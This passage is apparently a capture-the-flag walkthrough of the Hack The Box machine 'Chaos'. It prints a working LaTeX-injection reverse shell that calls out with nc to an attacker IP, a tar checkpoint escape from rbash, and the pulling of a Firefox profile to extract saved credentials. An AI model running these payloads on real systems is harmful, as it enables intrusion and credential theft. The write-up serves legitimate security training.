&lt;h4 id=&quot;we-got-some-ports-http-on-port-80-and-10000-email-related-services-imap-pop3-running-on-ports-110-143-993-and-995-lets-check-http&quot;&gt;We got some ports. &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and 10000, email related services (&lt;code class=&quot;highlighter-rouge&quot;&gt;imap&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pop3&lt;/code&gt;) running on ports 110, 143, 993 and 995. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;port-10000-gave-me-this-error-&quot;&gt;Port 10000 gave me this error :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-switched-to-https-and-got-a-login-form-&quot;&gt;So I switched to &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; and got a login form :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-have-any-credentials-and-i-ran-gobuster-and-got-nothing-interesting-so-we-will-ignore-this-and-look-at-port-80&quot;&gt;We don’t have any credentials and I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got nothing interesting so we will ignore this and look at port 80.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-just-a-normal-website-rest-of-it-&quot;&gt;It’s just a normal website, rest of it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-that-contact-form-and-its-doing-nothing-i-ran-gobuster-on-chaoshtb-and-got-these-results-&quot;&gt;I checked that contact form and it’s doing nothing. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://chaos.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 14:36:56 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/img (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
/source (Status: 301)
=====================================================
2019/05/24 14:40:36 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-now-this-part-is-tricky-because-going-to-the-ip-of-the-box-101010120-instead-of-chaoshtb-will-give-us-a-different-thing-virtual-hosting&quot;&gt;And now this part is tricky. Because going to the ip of the box &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.120&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt; will give us a different thing (virtual hosting).&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-saying-direct-ip-not-allowed-i-ran-another-gobuster-scan-on-the-ip-and-got-different-results-&quot;&gt;It’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;Direct IP not allowed&lt;/code&gt;. I ran another &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; scan on the ip and got different results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.120/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 14:41:52 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/wp (Status: 301)
=====================================================
2019/05/24 14:45:37 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;on-chaoshtb-the-thing-the-caught-my-attention-was-source-so-i-checked-that-and-it-didnt-have-anything-&quot;&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt; the thing the caught my attention was &lt;code class=&quot;highlighter-rouge&quot;&gt;/source&lt;/code&gt; so I checked that and it didn’t have anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-http101010120wp-and-found-a-wordpress-website-&quot;&gt;I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.120/wp&lt;/code&gt; and found a &lt;code class=&quot;highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; website :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-looked-at-the-posts-there-was-only-one-post-and-it-was-password-protected-&quot;&gt;I looked at the posts, there was only one post and it was password protected :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-clicked-on-the-post-link-and-saw-that-the-author-of-the-post-is-called-human-&quot;&gt;I clicked on the post link and saw that the author of the post is called &lt;code class=&quot;highlighter-rouge&quot;&gt;human&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-trying-to-bruteforce-the-password-i-tried-some-basic-stuff-first-and-the-usernameusername-type-of-credentials-worked-the-password-was-human-&quot;&gt;Before trying to bruteforce the password I tried some basic stuff first and the &lt;code class=&quot;highlighter-rouge&quot;&gt;username:username&lt;/code&gt; type of credentials worked. The password was &lt;code class=&quot;highlighter-rouge&quot;&gt;human&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-some-credentials-for-mail--ayushjiujitsu&quot;&gt;And we got some credentials for mail : &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush:jiujitsu&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;accessing-the-e-mail-service-decrypting-secret-message&quot;&gt;Accessing the e-mail Service, Decrypting Secret Message&lt;/h3&gt;
&lt;h4 id=&quot;we-saw-earlier-some-email-services-running-on-the-machine-now-we-have-credentials-to-access-these-services-to-do-that-we-will-use-an-email-client-i-used-claws-mail-can-be-installed-with-apt-and-configured-it-like-this-&quot;&gt;We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;claws-mail&lt;/code&gt; (can be installed with apt) and configured it like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inbox-was-empty-but-drafts-had-something-&quot;&gt;Inbox was empty but drafts had something :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;From: ayush &amp;lt;ayush@localhost&amp;gt;
To: undisclosed-recipients:;
Subject: service
Date: Sun, 28 Oct 2018 17:46:38 +0530
User-Agent: Roundcube Webmail/1.3.8

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-the-message-he-attached-two-files--enim_msgtxt-and-enpy-he-said-you-are-the-password-so-first-guess--password-most-likely-will-be-sahay&quot;&gt;After the message he attached two files : &lt;code class=&quot;highlighter-rouge&quot;&gt;enim_msg.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;en.py&lt;/code&gt;. He said &lt;code class=&quot;highlighter-rouge&quot;&gt;you are the password&lt;/code&gt;, so first guess … password most likely will be &lt;code class=&quot;highlighter-rouge&quot;&gt;sahay&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;enim_msgtxt-is-the-encrypted-message-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;enim_msg.txt&lt;/code&gt; is the encrypted message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-enpy-is-the-script-used-to-encrypt-the-message-&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;en.py&lt;/code&gt; is the script used to encrypt the message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = &quot;en&quot; + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;by-looking-at-the-encryption-script-we-will-know-that-the-message-is--aes-encrypted-i-used-this-tool-to-decrypt-the-message-&quot;&gt;By looking at the encryption script we will know that the message is  AES encrypted. I used this &lt;a href=&quot;https://github.com/happygirlzt/Cryptography/blob/master/encrypt.py&quot;&gt;tool&lt;/a&gt; to decrypt the message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-sahay-worked-the-decrypted-message-was-saved-in-a-file-called-t-it-was-base64-encoded-so-i-had-to-decode-it-&quot;&gt;Password &lt;code class=&quot;highlighter-rouge&quot;&gt;sahay&lt;/code&gt; worked. The decrypted message was saved in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt;. It was base64 encoded so I had to decode it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-link--httpchaoshtbj00_w1ll_f1nd_n07h1n9_h3r3-lets-check-that&quot;&gt;We got a link : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3&lt;/code&gt;, Let’s check that.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploiting-latex-reverse-shell-as-www-data&quot;&gt;Exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;, Reverse Shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-a-web-application-that-creates-pdfs-theres-a-field-for-input-and-3-templates-to-choose-from-test1-test2-test3-before-trying-to-create-a-pdf-i-ran-gobuster-and-got-these-results-&quot;&gt;It’s a web application that creates pdfs, There’s a field for input and 3 templates to choose from (&lt;code class=&quot;highlighter-rouge&quot;&gt;test1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;test2&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;test3&lt;/code&gt;) before trying to create a pdf I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/24 16:38:15 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/doc (Status: 301)
/index.php (Status: 200)
/pdf (Status: 301)
/source (Status: 301)
/templates (Status: 301)
=====================================================
2019/05/24 16:39:53 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;doc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/doc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/25.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nothing-important-just-some-documentation-pdfs-there-was-a-directory-called-latex-this-reveals-that-the-web-app-is-using-latex&quot;&gt;Nothing important, just some documentation pdfs. There was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;latex&lt;/code&gt;, this reveals that the web app is using &lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;pdf-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/pdf&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-is-where-the-created-pdfs-are-saved-i-looked-at-some-of-them-and-they-were-just-tests-like-this-one-for-example-&quot;&gt;This is where the created pdfs are saved, I looked at some of them and they were just tests. Like this one for example :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-to-create-a-pdf-and-intercepted-the-request-with-burp-&quot;&gt;I tried to create a pdf and intercepted the request with burp :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-response-showed-a-full-log-which-revealed-type-and-version-of-the-backend-software-used-to-create-the-pdfs&quot;&gt;The response showed a full log which revealed type and version of the backend software used to create the pdfs.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-the-first-template-failed-&quot;&gt;However the first template failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;test2-worked-fine-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;test2&lt;/code&gt; worked fine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/chaos/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;test3-as-well-latex-can-be-injectable-and-can-cause-some-vulnerabilities-if-there-wasnt-a-good-filter-i-tried-some-payloads-from-payloads-all-the-things-and-most-of-them-got-filtered-but-this-injection-payload-worked--immediatewrite18command-so-i-got-a-reverse-shell-like-this-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;test3&lt;/code&gt; as well. &lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt; can be injectable and can cause some vulnerabilities if there wasn’t a good filter. I tried some payloads from &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection&quot;&gt;Payloads All The Things&lt;/a&gt; and most of them got filtered. But this injection payload worked : &lt;code class=&quot;highlighter-rouge&quot;&gt;\immediate\write18{command}&lt;/code&gt;. So I got a reverse shell like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;payload--immediatewrite18rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf&quot;&gt;Payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f}&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;url-encoded--immediatewrite18rmtmpf3bmkfifotmpf3bcattmpfbinsh-i2261nc1010xxxx1337tmpf&quot;&gt;Url Encoded : &lt;code class=&quot;highlighter-rouge&quot;&gt;\immediate\write18{rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+10.10.xx.xx+1337+&amp;gt;/tmp/f}&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-a-reverse-shell-as-www-data-there-are-two-users-on-the-box--sahay-and-ayush-we-need-to-be-one-of-them-&quot;&gt;We got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;, There are two users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;sahay&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt;. We need to be one of them :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;privilege-escalation-to-ayush-bypassing-rbash-user-flag&quot;&gt;Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt;, Bypassing &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt;, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;we-got-earlier-ayush-credentials-for-mail--ayushjiujitsu-lets-try-that-password-&quot;&gt;We got earlier &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; credentials for mail : &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush:jiujitsu&lt;/code&gt; let’s try that password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-we-are-in-a-restricted-bash-shell-now&quot;&gt;It worked but we are in a restricted bash shell now.&lt;/h4&gt;
&lt;h4 id=&quot;this-guide-is-useful-for-bypassing-restricted-shells-i-tried-some-commands-to-know-what-can-i-do-from-that-shell-and-i-could-run-tar-so-i-went-back-to-www-data-and-went-to-tmp&quot;&gt;&lt;a href=&quot;https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf&quot;&gt;This guide&lt;/a&gt; is useful for bypassing restricted shells. I tried some commands to know what can I do from that shell and I could run &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt;. So I went back to &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; and went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-created-a-file-and-called-it-rick--touch-rick&quot;&gt;I created a file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;rick&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;touch rick&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-i-added-that-file-to-a-tar-archive-and-called-it-ricktar--tar--cvf-ricktar-rick&quot;&gt;Then I added that file to a tar archive and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;rick.tar&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;tar -cvf rick.tar rick&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-went-back-to-ayush-and-used-tar-to-bypass-the-shell--tar-cf-devnull-ricktar---checkpoint1---checkpoint-actionexecbinbash&quot;&gt;I went back to &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; and used &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; to bypass the shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-that-i-just-had-to-fix-my-path-and-i-had-a-functioning-bash-shell--export-pathpathusrlocalsbinusrlocalbinusrsbinusrbinsbinbin&quot;&gt;After that I just had to fix my path and I had a functioning bash shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-read-the-user-flag-&quot;&gt;Now we can read the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;extracting-credentials-from-firefox-profile-privilege-escalation-and-root-flag&quot;&gt;Extracting Credentials from Firefox Profile, Privilege Escalation and Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;by-looking-at-the-home-directory-for-ayush-i-saw-something-strange-&quot;&gt;By looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt; I saw something strange :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-was-a-mozilla-data-directory-there-i-went-there-and-there-was-a-directory-for-firefox-and-it-had-a-profile-&quot;&gt;There was a &lt;code class=&quot;highlighter-rouge&quot;&gt;.mozilla&lt;/code&gt; data directory there. I went there and there was a directory for Firefox and it had a profile :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-use-a-tool-called-firefox-decrypt-and-pass-that-profile-to-it-this-tool-extracts-credentials-from-firefox-profiles&quot;&gt;We can use a tool called &lt;a href=&quot;https://github.com/unode/firefox_decrypt&quot;&gt;firefox decrypt&lt;/a&gt; and pass that profile to it. This tool extracts credentials from Firefox profiles.&lt;/h4&gt;
&lt;h4 id=&quot;i-had-to-get-the-firefox-directory-on-my-box-first-i-ran-a-python-simple-http-server-on-port-1919-in-homeayushmozillafirefox-then-on-my-box-i-created-a-directory-called-firefox-and-downloaded-the-contents-of-the-original-firefox-directory-from-the-simple-http-server--wget-httpchaoshtb1919---recursive&quot;&gt;I had to get the &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox&lt;/code&gt; directory on my box first, I ran a python simple http server on port 1919 in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ayush/.mozilla/firefox&lt;/code&gt; then on my box I created a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox&lt;/code&gt; and downloaded the contents of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox&lt;/code&gt; directory from the simple http server : &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://chaos.htb:1919/ --recursive&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;server-log-&quot;&gt;Server Log :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;downloaded-files-were-saved-in-a-directory-called-chaoshtb1919&quot;&gt;Downloaded files were saved in a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb:1919&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;after-that-i-used-firefox_decryptpy-and-gave-it-the-profile-which-was-called-bzo7sjt1default-&quot;&gt;After that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;firefox_decrypt.py&lt;/code&gt; and gave it the profile which was called &lt;code class=&quot;highlighter-rouge&quot;&gt;bzo7sjt1.default&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./firefox_decrypt.py ../firefox/chaos.htb\:1919/bzo7sjt1.default/&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/chaos/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asked-for-a-password-i-gave-ayushs-password-jiujitsu-and-it-worked-we-got-credentials-for-the-application-that-was-running-on-port-10000-and-the-username-was-root--rootthiv8wrej&quot;&gt;It asked for a password, I gave &lt;code class=&quot;highlighter-rouge&quot;&gt;ayush&lt;/code&gt;’s password (&lt;code class=&quot;highlighter-rouge&quot;&gt;jiujitsu&lt;/code&gt;) and it worked. We got credentials for the application that was running on port 10000 and the username was &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;root:Thiv8wrej~&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-didnt-go-to-port-10000-again-i-tried-su-root-first-with-this-password-and-it-worked-&quot;&gt;I didn’t go to port 10000 again, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;su root&lt;/code&gt; first with this password and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
